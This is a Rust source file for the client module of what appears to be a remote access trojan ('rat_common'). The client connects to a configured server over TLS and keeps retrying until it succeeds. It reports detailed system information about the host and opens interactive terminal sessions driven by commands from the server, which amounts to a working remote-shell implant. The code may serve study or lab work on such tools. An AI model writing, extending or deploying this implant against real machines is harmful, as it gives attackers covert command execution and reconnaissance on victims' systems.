use std::collections::{HashMap, VecDeque};
use std::sync::Arc;
use std::time::Duration;

use async_trait::async_trait;
use log::{debug, error, info, warn};
use rat_common::framework::{ModuleImpl, ModuleState};
use rat_common::schema::{
    ClientMessage, ClientMessageData, ServerMessage, ServerMessageData, SessionCreateRequest,
    SystemInfo,
};
use rat_common::snowflake::SnowflakeId;
use rustls::ClientConfig;
use sysinfo::System;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{Mutex, mpsc};
use tokio::time::sleep;
use tokio_rustls::TlsConnector;
use tokio_rustls::client::TlsStream;

use crate::config::Config;
use crate::sessions::Session;
use crate::sessions::terminal::TerminalSession;

pub enum Event {
    Send(ClientMessage),
    Receive(Vec<u8>),
    Terminate,
}

pub struct Client {
    _config: Config,
    _stream: Mutex<(TlsStream<TcpStream>, mpsc::Receiver<ClientMessage>)>,
    _sender: mpsc::Sender<ClientMessage>,
    _total_read_buf: Mutex<VecDeque<u8>>,
    _sessions: Mutex<HashMap<SnowflakeId, Arc<dyn Session>>>,
    _system: Mutex<System>,
    _state: Arc<ModuleState>,
}

impl Client {
    pub async fn connect(config: Config) -> Self {
        let stream = Self::_reconnect(&config).await;
        let (sender, receiver) = mpsc::channel(1);

        let mut system = System::new_all();
        system.refresh_all();

        Self {
            _config: config,
            _stream: Mutex::new((stream, receiver)),
            _sender: sender,
            _total_read_buf: Mutex::new(VecDeque::new()),
            _sessions: Mutex::new(HashMap::new()),
            _system: Mutex::new(system),
            _state: ModuleState::new(),
        }
    }

    /// Reference: https://github.com/rustls/tokio-rustls/blob/main/examples/client.rs
    async fn _reconnect(config: &Config) -> TlsStream<TcpStream> {
        let tls = ClientConfig::builder()
            .with_root_certificates(config.cert_trusted_roots.clone())
            .with_no_client_auth();
        let connector = TlsConnector::from(Arc::new(tls));

        loop {
            match TcpStream::connect(&config.server).await {
                Ok(stream) => match connector
                    .connect(config.cert_server_name.clone(), stream)
                    .await
                {
                    Ok(stream) => {
                        return stream;
                    }
                    Err(e) => {
                        let wait = Duration::from_millis(5000); // TODO: Exponential backoff + random jitter
                        warn!("TLS handshake failed: {e}. Retrying in {wait:?}...");
                        sleep(wait).await;
                    }
                },
                Err(e) => {
                    let wait = Duration::from_millis(5000); // TODO: Exponential backoff + random jitter
                    warn!("Unable to connect to server: {e}. Retrying in {wait:?}...");
                    sleep(wait).await;
                }
            }
        }
    }

    async fn _process_message(
        self: Arc<Self>,
        message: ServerMessage,
    ) -> anyhow::Result<ClientMessage> {
        debug!("Received message from server: {message:#?}");
        let id = message.id;
        match message.data {
            ServerMessageData::Ping => Ok(ClientMessage {
                id,
                data: ClientMessageData::Pong,
            }),
            ServerMessageData::SystemInfoQuery => Ok(ClientMessage {
                id,
                data: ClientMessageData::SystemInfoQueryResponse {
                    info: SystemInfo {
                        boot_time: System::boot_time(),
                        cpu_arch: System::cpu_arch(),
                        distribution_id: System::distribution_id(),
                        host_name: System::host_name(),
                        kernel_long_version: System::kernel_long_version(),
                        kernel_version: System::kernel_version(),
                        long_os_version: System::long_os_version(),
                        name: System::name(),
                        open_files_limit: System::open_files_limit(),
                        os_version: System::os_version(),
                        physical_core_count: System::physical_core_count(),
                        uptime: System::uptime(),
                    },
                },
            }),
            ServerMessageData::SessionQuery => Ok(ClientMessage {
                id,
                data: ClientMessageData::SessionQueryResponse {
                    sessions: self
                        ._sessions
                        .lock()
                        .await
                        .values()
                        .map(|s| s.metadata())
                        .collect(),
                },
            }),
            ServerMessageData::SessionCreate { request } => {
                let mut sessions = self._sessions.lock().await;
                let session: Arc<dyn Session> = match request {
                    SessionCreateRequest::Terminal => {
                        Arc::new(TerminalSession::new(Arc::downgrade(&self)).await?)
                    }
                };

                let metadata = session.metadata();

                self.add_submodule(session.clone()).await;
                sessions.insert(metadata.id, session);

                Ok(ClientMessage {
                    id,
                    data: ClientMessageData::SessionCreateResponse { session: metadata },
                })
            }
            ServerMessageData::SessionInput { session_id, input } => {
                let sessions = self._sessions.lock().await;
                match sessions.get(&session_id) {
                    Some(session) => {
                        session.input(input).await?;
                        Ok(ClientMessage {
                            id,
                            data: ClientMessageData::SessionInputResponse,
                        })
                    }
                    None => anyhow::bail!("Received input for non-existent session {session_id}"),
                }
            }
            ServerMessageData::SessionStateQuery { session_id } => {
                let sessions = self._sessions.lock().await;
                match sessions.get(&session_id) {
                    Some(session) => Ok(ClientMessage {
                        id,
                        data: ClientMessageData::SessionStateQueryResponse {
                            data: session.query_current_state().await?,
                        },
                    }),
                    None => anyhow::bail!("Received input for non-existent session {session_id}"),
                }
            }
        }
    }

    pub async fn send(&self, message: &ClientMessage) -> anyhow::Result<()> {
        self._sender.send(message.clone()).await?;
        Ok(())
    }
}

#[async_trait]
impl ModuleImpl for Client {
    type EventType = Event;

    fn name(&self) -> &str {
        "Client"
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let (stream, receiver) = &mut *self._stream.lock().await;
        let mut buffer = vec![0; 1024];

        tokio::select! {
            Ok(size) = stream.read(&mut buffer) => match size {
                0 => Event::Terminate,
                size => {
                    buffer.truncate(size);
                    Event::Receive(buffer)
                },
            },
            Some(message) = receiver.recv() => Event::Send(message),
            else => Event::Terminate,
        }
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        match event {
            Event::Send(message) => {
                let data = postcard::to_stdvec_cobs(&message)?;
                let mut state = self._stream.lock().await;
                state.0.write_all(&data).await?;
                state.0.flush().await?;
                debug!("Sent {data:02X?} to server");
            }
            Event::Receive(data) => {
                debug!("Received {data:02X?} from server");
                let mut total_read_buf = self._total_read_buf.lock().await;
                let mut offset = total_read_buf.len();
                total_read_buf.extend(data);

                while offset < total_read_buf.len() {
                    if total_read_buf[offset] == 0 {
                        let mut frame = total_read_buf.drain(..=offset).collect::<Vec<u8>>();
                        offset = 0;

                        let self_c = self.clone();
                        tokio::spawn(async move {
                            match postcard::from_bytes_cobs::<ServerMessage>(&mut frame) {
                                Ok(message) => {
                                    let id = message.id;
                                    match self_c.clone()._process_message(message).await {
                                        Ok(response) => {
                                            let _ = self_c.send(&response).await;
                                        }
                                        Err(e) => {
                                            error!("Error processing message from server: {e}");
                                            let _ = self_c
                                                .send(&ClientMessage {
                                                    id,
                                                    data: ClientMessageData::Error {
                                                        message: e.to_string(),
                                                    },
                                                })
                                                .await;
                                        }
                                    }
                                }
                                Err(e) => {
                                    error!(
                                        "Received malformed message from server: {frame:02X?} ({e})"
                                    );
                                }
                            }
                        });
                    } else {
                        offset += 1;
                    }
                }
            }
            Event::Terminate => {
                error!("Server disconnected. Reconnecting...");

                let new_stream = tokio::select! {
                    s = Self::_reconnect(&self._config) => s,
                    _ = self.wait_until_stopped() => {
                        return Ok(());
                    }
                };

                info!("Reconnected to server");

                let mut state = self._stream.lock().await;
                let mut total_read_buf = self._total_read_buf.lock().await;

                state.0 = new_stream;
                total_read_buf.clear();
            }
        }

        Ok(())
    }

    async fn submodules_remove_hook(self: Arc<Self>) -> anyhow::Result<()> {
        let mut sessions = self._sessions.lock().await;
        sessions.retain(|_, session| session.is_running());
        Ok(())
    }
}
